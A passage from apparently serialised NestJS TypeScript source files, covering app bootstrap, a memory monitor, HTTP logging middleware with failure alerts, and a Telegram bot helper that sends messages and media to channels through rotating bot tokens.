'GET,PUT,POST,DELETE');\n    res.header('Access-Control-Allow-Headers', 'Content-Type, Accept');\n    next();\n  });\n\n  app.enableCors({\n    allowedHeaders: \"*\",\n    origin: \"*\"\n  });\n  const document = SwaggerModule.createDocument(app, config);\n  fs.writeFileSync('./swagger-spec.json', JSON.stringify(document, null, 2));\n  SwaggerModule.setup('api', app, document);\n  mongoose.set('debug', true)\n  app.useGlobalPipes(new ValidationPipe({\n    transform: true,\n    // whitelist: true,\n    // forbidNonWhitelisted: true,\n    transformOptions: {\n      enableImplicitConversion: true\n    },\n    // validationError: {\n    //   target: false,\n    //   value: undefined\n    // }\n  }));\n  process.on('unhandledRejection', (reason, promise) => {\n    console.error('Unhandled Rejection at:', promise, 'reason:', reason);\n  });\n\n  process.on('uncaughtException', (reason, promise) => {\n    console.log('Uncaught Exception at:');\n    console.error(promise, reason);\n  });\n\n  let isShuttingDown = false;\n  const shutdown = async (signal: string) => {\n    if (isShuttingDown) return;\n    isShuttingDown = true;\n    console.log(`${signal} received`);\n    console.log(\"CTS exit Request\")\n    await app.close();\n    process.exit(0);\n  };\n\n  process.on('exit', async () => {\n    console.log('Application closed');\n  });\n\n  process.on('SIGINT', async () => {\n    console.log('SIGINT received');\n    await shutdown('SIGINT');\n  });\n\n  process.on('SIGTERM', async () => {\n    console.log('SIGTERM received');\n    await shutdown('SIGTERM');\n  });\n\n  process.on('SIGQUIT', async () => {\n    console.log('SIGQUIT received');\n    await shutdown('SIGQUIT');\n  });\n\n  await app.init();\n  await app.listen(process.env.PORT || 9000);\n  console.log(`Application is running on: ${await app.getUrl()}`);\n}\nbootstrap();\n","// src/common/memory-cleaner.service.ts\r\nimport { Injectable, Logger, OnModuleInit, OnModuleDestroy } from '@nestjs/common';\r\n\r\n@Injectable()\r\nexport class MemoryCleanerService implements OnModuleInit, OnModuleDestroy {\r\n  private readonly logger = new Logger(MemoryCleanerService.name);\r\n  private intervalId: NodeJS.Timeout | null = null;\r\n  private readonly memoryLimitMB = 400; // Threshold in MB\r\n  private readonly cleanupIntervalMs = 5 * 60 * 1000; // 5 minutes\r\n\r\n  onModuleInit() {\r\n    this.logger.log('MemoryCleanerService initialized.');\r\n    this.intervalId = setInterval(() => this.monitorAndCleanup(), this.cleanupIntervalMs);\r\n  }\r\n\r\n  onModuleDestroy() {\r\n    if (this.intervalId) clearInterval(this.intervalId);\r\n  }\r\n\r\n  private getMemoryUsageInMB(): Record<string, string> {\r\n    const mem = process.memoryUsage();\r\n    return {\r\n      rss: (mem.rss / 1024 / 1024).toFixed(2),\r\n      heapUsed: (mem.heapUsed / 1024 / 1024).toFixed(2),\r\n      heapTotal: (mem.heapTotal / 1024 / 1024).toFixed(2),\r\n      external: (mem.external / 1024 / 1024).toFixed(2),\r\n    };\r\n  }\r\n\r\n  private monitorAndCleanup() {\r\n    const mem = process.memoryUsage();\r\n    const heapUsedMB = mem.heapUsed / 1024 / 1024;\r\n\r\n    this.logger.log(`🧠 Heap Used: ${heapUsedMB.toFixed(2)} MB`);\r\n\r\n    if (heapUsedMB > this.memoryLimitMB) {\r\n      this.logger.warn(`🚨 Heap exceeded ${this.memoryLimitMB} MB. Cleaning up...`);\r\n      this.cleanupMemory();\r\n    }\r\n  }\r\n\r\n  cleanupMemory() {\r\n    if (typeof global.gc === 'function') {\r\n      global.gc();\r\n      this.logger.log('✅ Manual GC triggered via global.gc()');\r\n    } else {\r\n      this.logger.warn('⚠️ GC not available. Start Node with --expose-gc');\r\n    }\r\n\r\n    const mem = this.getMemoryUsageInMB();\r\n    this.logger.log(`🧹 Memory After Cleanup: ${JSON.stringify(mem)}`);\r\n  }\r\n}\r\n","import { Injectable, NestMiddleware, Logger } from '@nestjs/common';\nimport { Request, Response, NextFunction } from 'express';\nimport { fetchWithTimeout } from '../utils/fetchWithTimeout';\nimport { parseError } from '../utils/parseError';\nimport { notifbot } from '../utils/logbots';\n\n@Injectable()\nexport class LoggerMiddleware implements NestMiddleware {\n    private readonly logger = new Logger('HTTP');\n\n    use(req: Request, res: Response, next: NextFunction): void {\n        const { method, originalUrl, baseUrl } = req;\n        const userAgent = req.get('user-agent') || '';\n        const ip = req.ip;\n\n        const excludedEndpoints = ['/sendtochannel', '/favicon.', '/tgsignup', '/timestamps'];\n        const isExcluded = (url: string) => excludedEndpoints.some(endpoint => url.startsWith(endpoint));\n        if (!isExcluded(originalUrl) && originalUrl !== '/') {\n            res.on('finish', () => {\n                const { statusCode } = res;\n                const contentLength = res.get('content-length');\n                if (statusCode >= 500) {\n                    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`${process.env.clientId}\\nService:${process.env.serviceName}\\n\\nFailed - ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.error(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 400) {\n                    fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`${process.env.clientId}\\nService:${process.env.serviceName}\\n\\nFailed - ${originalUrl} with ${statusCode}`)}`);\n                    this.logger.warn(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else if (statusCode >= 300) {\n                    this.logger.verbose(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                } else {\n                    this.logger.log(`${method} ${originalUrl} ${req.ip} || StatusCode : ${statusCode}`);\n                }\n            });\n            res.on('error', (error) => {\n                const errorDetails = parseError(error, process.env.clientId);\n                fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Failed :: ${originalUrl} with ${errorDetails.message}`)}`);\n            })\n        } else {\n            if (originalUrl.includes('Video')) {\n                this.logger.log(`Excluded endpoint hit: ${originalUrl} (length: ${originalUrl.length})`);\n            }\n        }\n\n        next();\n    }\n}\n","import axios from 'axios';\nimport FormData from 'form-data';\n\nexport enum ChannelCategory {\n    CLIENT_UPDATES = 'CLIENT_UPDATES',\n    USER_WARNINGS = 'USER_WARNINGS',\n    VC_WARNINGS = 'VC_WARNINGS',\n    USER_REQUESTS = 'USER_REQUESTS',\n    VC_NOTIFICATIONS = 'VC_NOTIFICATIONS',\n    CHANNEL_NOTIFICATIONS = 'CHANNEL_NOTIFICATIONS',\n    ACCOUNT_NOTIFICATIONS = 'ACCOUNT_NOTIFICATIONS',\n    ACCOUNT_LOGIN_FAILURES = 'ACCOUNT_LOGIN_FAILURES',\n    PROMOTION_ACCOUNT = 'PROMOTION_ACCOUNT',\n    CLIENT_ACCOUNT = 'CLIENT_ACCOUNT',\n    PAYMENT_FAIL_QUERIES = 'PAYMENT_FAIL_QUERIES',\n    SAVED_MESSAGES = 'SAVED_MESSAGES',\n    HTTP_FAILURES = 'HTTP_FAILURES',\n    UNVDS = 'UNVDS',\n    PROM_LOGS1 = 'PROM_LOGS1',\n    PROM_LOGS2 = 'PROM_LOGS2',\n}\n\nexport interface SendMessageOptions {\n    parseMode?: 'HTML' | 'MarkdownV2' | 'Markdown';\n    disableWebPagePreview?: boolean;\n    disableNotification?: boolean;\n    replyToMessageId?: number;\n    allowSendingWithoutReply?: boolean;\n    protectContent?: boolean;\n    linkPreviewOptions?: {\n        isDisabled?: boolean;\n        url?: string;\n        preferSmallMedia?: boolean;\n        preferLargeMedia?: boolean;\n        showAboveText?: boolean;\n    };\n}\n\nexport interface MediaOptions extends Omit<SendMessageOptions, 'disableWebPagePreview' | 'linkPreviewOptions'> {\n    caption?: string;\n    hasSpoiler?: boolean;\n}\n\nexport interface PhotoOptions extends MediaOptions {\n    // Photo-specific options can be added here\n}\n\nexport interface VideoOptions extends MediaOptions {\n    duration?: number;\n    width?: number;\n    height?: number;\n    thumbnail?: Buffer | string;\n    supportsStreaming?: boolean;\n}\n\nexport interface AudioOptions extends MediaOptions {\n    duration?: number;\n    performer?: string;\n    title?: string;\n    thumbnail?: Buffer | string;\n}\n\nexport interface DocumentOptions extends MediaOptions {\n    thumbnail?: Buffer | string;\n    disableContentTypeDetection?: boolean;\n}\n\nexport interface VoiceOptions extends Omit<MediaOptions, 'caption'> {\n    duration?: number;\n}\n\nexport interface VideoNoteOptions extends Omit<MediaOptions, 'caption'> {\n    duration?: number;\n    length?: number;\n    thumbnail?: Buffer | string;\n}\n\nexport interface AnimationOptions extends MediaOptions {\n    duration?: number;\n    width?: number;\n    height?: number;\n    thumbnail?: Buffer | string;\n}\n\nexport interface StickerOptions extends Omit<MediaOptions, 'caption'> {\n    emoji?: string;\n}\n\nexport interface MediaGroupItem {\n    type: 'photo' | 'video' | 'audio' | 'document';\n    media: Buffer | string; // Buffer for local files, string for URLs or file_id\n    caption?: string;\n    parseMode?: 'HTML' | 'Markdown' | 'MarkdownV2';\n    hasSpoiler?: boolean;\n\n    // Extension for proper filename\n    extension?: string;\n\n    // Video-specific properties\n    duration?: number;\n    width?: number;\n    height?: number;\n    supportsStreaming?: boolean;\n\n    // Audio-specific properties\n    performer?: string;\n    title?: string;\n\n    // Document-specific properties\n    thumbnail?: Buffer; // Thumbnail for documents\n}\n\nexport interface MediaGroupOptions extends Omit<SendMessageOptions, 'parseMode' | 'disableWebPagePreview' | 'linkPreviewOptions'> {\n    // Media group options\n}\n\ntype ChannelData = {\n    botTokens: string[];\n    botUsernames: string[];\n    lastUsedIndex: number;\n    channelId: string;\n};\n\nexport class BotConfig {\n    private static instance: BotConfig;\n    private categoryMap = new Map<ChannelCategory, ChannelData>();\n    private initialized = false;\n    private initializing = false;\n    private initPromise: Promise<void> | null = null;\n    private initRetries = 0;\n    private readonly MAX_RETRIES = 3;\n    private readonly RETRY_DELAY = 2000; // 2 seconds\n\n    private constructor() {\n        // Immediate initialization with fallback to lazy initialization\n        this.initPromise = this.initialize();\n    }\n\n    /**\n     * Get the singleton instance and trigger immediate initialization\n     * @returns BotConfig instance\n     */\n    public static getInstance(): BotConfig {\n        if (!BotConfig.instance) {\n            BotConfig.instance = new BotConfig();\n            // Note: Constructor already starts initialization\n        }\n        return BotConfig.instance;\n    }\n\n    /**\n     * Initialize the configuration immediately and wait for completion\n     * @returns Promise that resolves when initialization is complete\n     */\n    public static async initializeAndGetInstance(): Promise<BotConfig> {\n        const instance = BotConfig.getInstance();\n        await instance.ready();\n        return instance;\n    }\n\n    /**\n     * Ensures the configuration is ready before proceeding\n     * @returns Promise that resolves when initialization is complete\n     */\n    public async ready(): Promise<void> {\n        if (this.initialized) {\n            return;\n        }\n\n        if (!this.initPromise) {\n            // This is a fallback if somehow the constructor initialization failed\n            this.initPromise = this.initialize();\n        }\n\n        return this.initPromise;\n    }\n\n    /**\n     * Initialize the configuration by fetching bot data\n     */\n    private async initialize(): Promise<void> {\n        if (this.initialized || this.initializing) {\n            return;\n        }\n\n        try {\n            this.initializing = true;\n            console.debug('Initializing Telegram channel configuration...');\n\n            const envKeys = Object.keys(process.env).filter(key =>\n                key.startsWith('TELEGRAM_CHANNEL_CONFIG_')\n            );\n\n            for (const key of envKeys) {\n                const value = process.env[key];\n                if (!value) continue;\n\n                try {\n                    const [channelId, description = '', botTokensStr] = value.split('::');\n                    const botTokens = botTokensStr?.split(',').map(t => t.trim()).filter(Boolean);\n\n                    if (!channelId || !botTokens || botTokens.length === 0) {\n                        console.warn(`Invalid configuration for ${key}: missing channelId or botTokens`);\n                        continue;\n                    }\n\n                    const category = this.getCategoryFromDescription(description);\n                    if (!category) {\n                        console.warn(`Invalid category in description for ${key}: ${description}`);\n                        continue;\n                    }\n\n                    const botUsernames: string[] = [];\n                    for (const token of botTokens) {\n                        try {\n                            const username = await this.fetchUsername(token);\n                            if (!username) {\n                                console.warn(`Invalid bot token in ${category}`);\n                                continue;\n                            }\n                            botUsernames.push(username);\n                        } catch (error) {\n                            console.error(`Error fetching username for token in ${category}:`, error);\n                        }\n                    }\n\n                    if (botUsernames.length === 0) {\n                        console.warn(`No valid bot usernames found for ${category}`);\n                        continue;\n                    }\n\n                    this.categoryMap.set(category, {\n                        botTokens,\n                        botUsernames,\n                        lastUsedIndex: -1,\n                        channelId,\n                    });\n                } catch (error) {\n                    console.error(`Error processing configuration for ${key}:`, error);\n                }\n            }\n\n            // Initialize bots after configuration is loaded\n            await this.initializeBots();\n\n            this.initialized = true;\n            console.info(`BotConfig initialized successfully with ${this.categoryMap.size} categories.`);\n        } catch (error) {\n            console.error('Failed to initialize BotConfig:', error);\n\n            if (this.initRetries < this.MAX_RETRIES) {\n                this.initRetries++;\n                console.info(`Retrying initialization (attempt ${this.initRetries}/${this.MAX_RETRIES})...`);\n\n                // Reset state for retry\n                this.initializing = false;\n                this.initPromise = null;\n\n                // Wait before retrying\n                await new Promise(resolve => setTimeout(resolve, this.RETRY_DELAY));\n                return this.initialize();\n            } else {\n                console.error(`Failed to initialize after ${this.MAX_RETRIES} attempts`);\n                throw error;\n            }\n        } finally {\n            this.initializing = false;\n        }\n    }\n\n    /**\n     * Extract category from description string\n     */\n    private getCategoryFromDescription(desc: string): ChannelCategory | null {\n        if (!desc) return null;\n\n        const normalized = desc.trim().toUpperCase();\n        return (Object.values(ChannelCategory) as string[]).find(cat =>\n            normalized.includes(cat) || cat.includes(normalized)\n        ) as ChannelCategory ?? null;\n    }\n\n    /**\n     * Fetch bot username from token\n     */\n    private async fetchUsername(token: string): Promise<string> {\n        if (!token || typeof token !== 'string' || token.length < 10) {\n            return '';\n        }\n\n        try {\n            const res = await axios.get(`https://api.telegram.org/bot${token}/getMe`, {\n                timeout: 5000 // 5 second timeout\n            });\n            return res.data?.ok ? res.data.result.username : '';\n        } catch (error) {\n            console.error('Error fetching bot username:', error);\n            return '';\n        }\n    }\n\n    /**\n     * Get bot username for specified category\n     */\n    public async getBotUsername(category: ChannelCategory): Promise<string> {\n        await this.ensureInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botUsernames.length === 0) {\n            throw new Error(`No valid bots configured for ${category}`);\n        }\n\n        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;\n        return data.botUsernames[data.lastUsedIndex];\n    }\n\n    /**\n     * Get channel ID for specified category\n     */\n    public async getChannelId(category: ChannelCategory): Promise<string> {\n        await this.ensureInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data) {\n            throw new Error(`No configuration found for ${category}`);\n        }\n\n        return data.channelId;\n    }\n\n    /**\n     * Get bot username, channel ID and token for specified category\n     */\n    public async getBotAndChannel(category: ChannelCategory): Promise<{\n        username: string;\n        channelId: string;\n        token: string\n    }> {\n        await this.ensureInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botUsernames.length === 0) {\n            throw new Error(`No valid bots configured for ${category}`);\n        }\n\n        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botUsernames.length;\n        return {\n            username: data.botUsernames[data.lastUsedIndex],\n            channelId: data.channelId,\n            token: data.botTokens[data.lastUsedIndex],\n        };\n    }\n\n    /**\n     * Send message to a channel using the configured bot\n     */\n    public async sendMessage(\n        category: ChannelCategory,\n        message: string,\n        options: SendMessageOptions = {}\n    ): Promise<boolean> {\n        await this.ensureInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botTokens.length === 0) {\n            throw new Error(`No valid bots configured for ${category}`);\n        }\n\n        // Get the next bot in rotation\n        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;\n        const botIndex = data.lastUsedIndex;\n        const token = data.botTokens[botIndex];\n        const channelId = data.channelId;\n\n        // Prepare request parameters\n        const params = new URLSearchParams({\n            chat_id: channelId,\n            text: `${process.env.clientId?.toUpperCase()}:\\n\\n${message}`,\n        });\n\n        if (options.parseMode) params.append('parse_mode', options.parseMode);\n        if (options.disableWebPagePreview) params.append('disable_web_page_preview', 'true');\n        if (options.disableNotification) params.append('disable_notification', 'true');\n        if (options.replyToMessageId) params.append('reply_to_message_id', options.replyToMessageId.toString());\n        if (options.allowSendingWithoutReply) params.append('allow_sending_without_reply', 'true');\n        if (options.protectContent) params.append('protect_content', 'true');\n\n        // Handle link preview options\n        if (options.linkPreviewOptions) {\n            const { isDisabled, url, preferSmallMedia, preferLargeMedia, showAboveText } = options.linkPreviewOptions;\n            if (isDisabled) params.append('disable_web_page_preview', 'true');\n            if (url) params.append('link_preview_url', url);\n            if (preferSmallMedia) params.append('prefer_small_media', 'true');\n            if (preferLargeMedia) params.append('prefer_large_media', 'true');\n            if (showAboveText) params.append('show_above_text', 'true');\n        }\n\n        const url = `https://api.telegram.org/bot${token}/sendMessage`;\n\n        // Try to send the message\n        try {\n            const response = await axios.post(url, params, {\n                timeout: 10000 // 10 second timeout\n            });\n            return response.data?.ok === true;\n        } catch (error) {\n            console.error(`Failed to send message to ${channelId} using bot at index ${botIndex}:`, error);\n            if (data.botTokens.length > 1 && data.botTokens.length > botIndex + 1) {\n                console.debug(`Retrying with next available bot for ${category}`);\n                data.lastUsedIndex = botIndex; // Will be incremented in the recursive call\n                return this.sendMessage(category, message, options);\n            }\n            return false;\n        }\n    }\n\n    /**\n     * Send photo to a channel\n     */\n    public async sendPhoto(\n        category: ChannelCategory,\n        photo: Buffer | string,\n        options: PhotoOptions = {}\n    ): Promise<boolean> {\n        return this.sendMedia(category, 'sendPhoto', photo, options);\n    }\n\n    /**\n     * Send video to a channel\n     */\n    public async sendVideo(\n        category: ChannelCategory,\n        video: Buffer | string,\n        options: VideoOptions = {}\n    ): Promise<boolean> {\n        return this.sendMedia(category, 'sendVideo', video, options);\n    }\n\n    /**\n     * Send audio to a channel\n     */\n    public async sendAudio(\n        category: ChannelCategory,\n        audio: Buffer | string,\n        options: AudioOptions = {}\n    ): Promise<boolean> {\n        return this.sendMedia(category, 'sendAudio', audio, options);\n    }\n\n    /**\n     * Send document to a channel\n     */\n    public async sendDocument(\n        category: ChannelCategory,\n        document: Buffer | string,\n        options: DocumentOptions = {}\n    ): Promise<boolean> {\n        return this.sendMedia(category, 'sendDocument', document, options);\n    }\n\n    /**\n     * Send voice message to a channel\n     */\n    public async sendVoice(\n        category: ChannelCategory,\n        voice: Buffer | string,\n        options: VoiceOptions = {}\n    ): Promise<boolean> {\n        return this.sendMedia(category, 'sendVoice', voice, options);\n    }\n\n    /**\n     * Send video note to a channel\n     */\n    public async sendVideoNote(\n        category: ChannelCategory,\n        videoNote: Buffer | string,\n        options: VideoNoteOptions = {}\n    ): Promise<boolean> {\n        return this.sendMedia(category, 'sendVideoNote', videoNote, options);\n    }\n\n    /**\n     * Send animation (GIF) to a channel\n     */\n    public async sendAnimation(\n        category: ChannelCategory,\n        animation: Buffer | string,\n        options: AnimationOptions = {}\n    ): Promise<boolean> {\n        return this.sendMedia(category, 'sendAnimation', animation, options);\n    }\n\n    /**\n     * Send sticker to a channel\n     */\n    public async sendSticker(\n        category: ChannelCategory,\n        sticker: Buffer | string,\n        options: StickerOptions = {}\n    ): Promise<boolean> {\n        return this.sendMedia(category, 'sendSticker', sticker, options);\n    }\n\n    /**\n     * Send media group (album) to a channel\n     */\n    public async sendMediaGroup(\n        category: ChannelCategory,\n        media: MediaGroupItem[],\n        options: MediaGroupOptions = {}\n    ): Promise<boolean> {\n        await this.ensureInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botTokens.length === 0) {\n            throw new Error(`No valid bots configured for ${category}`);\n        }\n\n        // Get the next bot in rotation\n        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;\n        const botIndex = data.lastUsedIndex;\n        const token = data.botTokens[botIndex];\n        const channelId = data.channelId;\n\n        const formData = new FormData();\n        formData.append('chat_id', channelId);\n\n        // Prepare media array\n        const mediaArray = [];\n        for (let i = 0; i < media.length; i++) {\n            const item = media[i];\n            const mediaObj: any = {\n                type: item.type,\n                media: Buffer.isBuffer(item.media) ? `attach://file${i}` : item.media,\n            };\n\n            mediaObj.caption = `${process.env.clientId.toUpperCase()}:\\n\\n${item.caption || ''}`;\n            if (item.parseMode) mediaObj.parse_mode = item.parseMode;\n            if (item.hasSpoiler) mediaObj.has_spoiler = true;\n\n            // Add type-specific properties\n            if (item.type === 'video') {\n                if (item.duration) mediaObj.duration = item.duration;\n                if (item.width) mediaObj.width = item.width;\n                if (item.height) mediaObj.height = item.height;\n                if (item.supportsStreaming) mediaObj.supports_streaming = true;\n            }\n\n            if (item.type === 'audio') {\n                if (item.duration) mediaObj.duration = item.duration;\n                if (item.performer) mediaObj.performer = item.performer;\n                if (item.title) mediaObj.title = item.title;\n            }\n\n            if (item.type === 'document') {\n                // For documents, we can add thumbnail if available\n                if (item.thumbnail && Buffer.isBuffer(item.thumbnail)) {\n                    mediaObj.thumbnail = `attach://thumb${i}`;\n                }\n            }\n\n            mediaArray.push(mediaObj);\n\n            // Add file to form data if it's a Buffer\n            if (Buffer.isBuffer(item.media)) {\n                // Generate proper filename with extension\n                let filename = `file${i}`;\n\n                if (item.extension) {\n                    // Use the extension from the item\n                    filename = `file${i}.${item.extension}`;\n                } else {\n                    // Fallback based on media type\n                    switch (item.type) {\n                        case 'photo':\n                            filename = `file${i}.jpg`;\n                            break;\n                        case 'video':\n                            filename = `file${i}.mp4`;\n                            break;\n                        case 'audio':\n                            filename = `file${i}.mp3`;\n                            break;\n                        case 'document':\n                            filename = `file${i}.bin`; // Generic binary file\n                            break;\n                    }\n                }\n\n                formData.append(`file${i}`, item.media, filename);\n            }\n\n            // Add thumbnail if present for documents\n            if (item.type === 'document' && item.thumbnail && Buffer.isBuffer(item.thumbnail)) {\n                formData.append(`thumb${i}`, item.thumbnail, `thumb${i}.jpg`);\n            }\n        }\n\n        formData.append('media', JSON.stringify(mediaArray));\n\n        // Add common options\n        if (options.disableNotification) formData.append('disable_notification', 'true');\n        if (options.replyToMessageId) formData.append('reply_to_message_id', options.replyToMessageId.toString());\n        if (options.allowSendingWithoutReply) formData.append('allow_sending_without_reply', 'true');\n        if (options.protectContent) formData.append('protect_content', 'true');\n\n        const url = `https://api.telegram.org/bot${token}/sendMediaGroup`;\n\n        try {\n            const response = await axios.post(url, formData, {\n                timeout: 30000, // 30 second timeout for media uploads\n                headers: {\n                    ...formData.getHeaders(),\n                },\n            });\n            return response.data?.ok === true;\n        } catch (error) {\n            console.error(`Failed to send media group to ${channelId} using bot at index ${botIndex}:`, error);\n            if (data.botTokens.length > 1 && data.botTokens.length > botIndex + 1) {\n                console.debug(`Retrying with next available bot for ${category}`);\n                data.lastUsedIndex = botIndex;\n                return this.sendMediaGroup(category, media, options);\n            }\n            return false;\n        }\n    }\n\n    /**\n     * Generic method to send media\n     */\n    private async sendMedia(\n        category: ChannelCategory,\n        method: string,\n        media: Buffer | string,\n        options: any = {}\n    ): Promise<boolean> {\n        await this.ensureInitialized();\n\n        const data = this.categoryMap.get(category);\n        if (!data || data.botTokens.length === 0) {\n            throw new Error(`No valid bots configured for ${category}`);\n        }\n\n        // Get the next bot in rotation\n        data.lastUsedIndex = (data.lastUsedIndex + 1) % data.botTokens.length;\n        const botIndex = data.lastUsedIndex;\n        const token = data.botTokens[botIndex];\n        const channelId = data.channelId;\n\n        const formData = new FormData();\n        formData.append('chat_id', channelId);\n\n        // Determine media field name based on method\n        const mediaField = method.replace('send', '').toLowerCase();\n\n        if (Buffer.isBuffer(media)) {\n            formData.append(mediaField, media, `${mediaField}.dat`);\n        } else {\n            formData.append(mediaField, media);\n        }\n\n        // Add common options\n        if (options.caption) formData.append('caption', `${process.env.clientId.toUpperCase()}:\\n\\n${options.caption}`);\n        if (options.parseMode) formData.append('parse_mode', options.parseMode);\n        if (options.disableNotification) formData.append('disable_notification', 'true');\n        if (options.replyToMessageId) formData.append('reply_to_message_id', options.replyToMessageId.toString());\n        if (options.allowSendingWithoutReply) formData.append('allow_sending_without_reply', 'true');\n        if (options.protectContent) formData.append('protect_content', 'true');\n        if (options.hasSpoiler) formData.append('has_spoiler', 'true');\n\n        // Add method-specific options\n        if (method === 'sendVideo') {\n            if (options.duration) formData.append('duration', options.duration.toString());\n            if (options.width) formData.append('width', options.width.toString());\n            if (options.height) formData.append('height', options.height.toString());\n            if (options.supportsStreaming) formData.append('supports_streaming', 'true');\n            if (options.thumbnail) {\n                if (Buffer.isBuffer(options.thumbnail)) {\n                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');\n                } else {\n                    formData.append('thumbnail', options.thumbnail);\n                }\n            }\n        }\n\n        if (method === 'sendAudio') {\n            if (options.duration) formData.append('duration', options.duration.toString());\n            if (options.performer) formData.append('performer', options.performer);\n            if (options.title) formData.append('title', options.title);\n            if (options.thumbnail) {\n                if (Buffer.isBuffer(options.thumbnail)) {\n                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');\n                } else {\n                    formData.append('thumbnail', options.thumbnail);\n                }\n            }\n        }\n\n        if (method === 'sendDocument') {\n            if (options.thumbnail) {\n                if (Buffer.isBuffer(options.thumbnail)) {\n                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');\n                } else {\n                    formData.append('thumbnail', options.thumbnail);\n                }\n            }\n            if (options.disableContentTypeDetection) formData.append('disable_content_type_detection', 'true');\n        }\n\n        if (method === 'sendVoice') {\n            if (options.duration) formData.append('duration', options.duration.toString());\n        }\n\n        if (method === 'sendVideoNote') {\n            if (options.duration) formData.append('duration', options.duration.toString());\n            if (options.length) formData.append('length', options.length.toString());\n            if (options.thumbnail) {\n                if (Buffer.isBuffer(options.thumbnail)) {\n                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');\n                } else {\n                    formData.append('thumbnail', options.thumbnail);\n                }\n            }\n        }\n\n        if (method === 'sendAnimation') {\n            if (options.duration) formData.append('duration', options.duration.toString());\n            if (options.width) formData.append('width', options.width.toString());\n            if (options.height) formData.append('height', options.height.toString());\n            if (options.thumbnail) {\n                if (Buffer.isBuffer(options.thumbnail)) {\n                    formData.append('thumbnail', options.thumbnail, 'thumbnail.jpg');\n                } else {\n                    formData.append('thumbnail', options.thumbnail);\n                }\n            }\n        }\n\n        if (method === 'sendSticker') {\n            if (options.emoji) formData.append('emoji', options.emoji);\n        }\n\n        const url = `https://api.telegram.org/bot${token}/${method}`;\n\n        try {\n            const response = await axios.post(url, formData, {\n                timeout: 30000, // 30 second timeout for media uploads\n                headers: {\n                    ...formData.getHeaders(),\n                },\n            });\n            return response.data?.ok === true;\n        } catch (error) {\n            console.error(`Failed to send ${method} to ${channelId} using bot at index ${botIndex}:`, error);\n            if (data.botTokens.length > 1 && data.botTokens.length > botIndex + 1) {\n                console.debug(`Retrying with next available bot for ${category}`);\n                data.lastUsedIndex = botIndex;\n                return this.sendMedia(category, method, media, options);\n            }\n            return false;\n        }\n    }\n\n    /**\n     * Initialize bots with /start command\n     */\n    private async initializeBots(): Promise<void> {\n        console.debug('Initializing bots with /start command...');\n\n        const initPromises: Promise<void>[] = [];\n\n        for (const [category, data] of this.categoryMap) {\n            for (const token of data.botTokens) {\n                const promise = (async () => {\n                    try {\n                        const botInfo = await axios.get(`https://api.telegram.org/bot${token}/getMe`, {\n                            timeout: 5000\n                        });\n\n                        if (!botInfo.data?.ok) {\n                            console.error(`Failed to get bot info for ${category}`);\n                            return;\n                        }\n                        console.debug(`Successfully initialized bot for ${category}`);\n                    } catch (error) {\n                        console.error(`Failed to initialize bot for ${category}:`, error);\n                    }\n                })();\n\n                initPromises.push(promise);\n            }\n        }\n\n        // Wait for all initialization attempts to complete\n        await Promise.allSettled(initPromises);\n    }\n\n    /**\n     * Ensure the class is initialized before performing operations\n     */\n    private async ensureInitialized(): Promise<void> {\n        if (!this.initialized) {\n            await this.ready();\n\n            if (!this.initialized) {\n                throw new Error('BotConfig initialization failed. Unable to proceed.');\n            }\n        }\n    }\n\n    /**\n     * Check if a category is configured\n     */\n    public async hasCategory(category: ChannelCategory): Promise<boolean> {\n        await this.ensureInitialized();\n        return this.categoryMap.has(category);\n    }\n\n    /**\n     * Get all configured categories\n     */\n    public async getConfiguredCategories(): Promise<ChannelCategory[]> {\n        await this.ensureInitialized();\n        return Array.from(this.categoryMap.keys());\n    }\n}","export function sleep(ms: number): Promise<void> {\n  return new Promise(resolve => setTimeout(resolve, ms));\n}\n\nexport function contains(str: string | null | undefined, arr: string[]): boolean {\n  if (typeof str !== 'string' || !Array.isArray(arr) || arr.length === 0) return false;\n\n  const normalizedStr = str.trim().toLowerCase();\n\n  return arr.some(element =>\n    typeof element === 'string' &&\n    element.trim() !== '' &&\n    normalizedStr.includes(element.trim().toLowerCase())\n  );\n}\n\nexport function toBoolean(value: string | number | boolean | null | undefined): boolean {\n  if (value === null || value === undefined) return false;\n  if (typeof value === 'string') {\n    const normalizedValue = value.toLowerCase().trim();\n    return normalizedValue === 'true' || normalizedValue === '1' || normalizedValue === 'yes';\n  }\n  if (typeof value === 'number') {\n    return value !== 0;\n  }\n  return value;\n}\n\nexport function fetchNumbersFromString(inputString: string | null | undefined): string {\n  if (!inputString) return '';\n  const regex = /\\d+/g;\n  const matches = inputString.match(regex);\n  return matches ? matches.join('') : '';\n}\n\nexport const defaultReactions = Object.freeze([\n  '❤', '🔥', '👏', '🥰', '😁', '🤔',\n  '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n  '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n  '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n  '🤣', '💔', '🏆', '😭', '😴', '👍',\n  '🌚', '⚡', '🍌', '😐', '💋', '👻',\n  '👀', '🙈', '🤝', '🤗', '🆒',\n  '🗿', '🙉', '🙊', '🤷', '👎'\n] as const);\n\nexport const defaultMessages = Object.freeze([\n  \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\",\n  \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\",\n  \"16\", \"17\", \"18\", \"19\", \"20\", \"21\"\n] as const);\n\nexport function areJsonsNotSame(json1: unknown, json2: unknown): boolean {\n  const 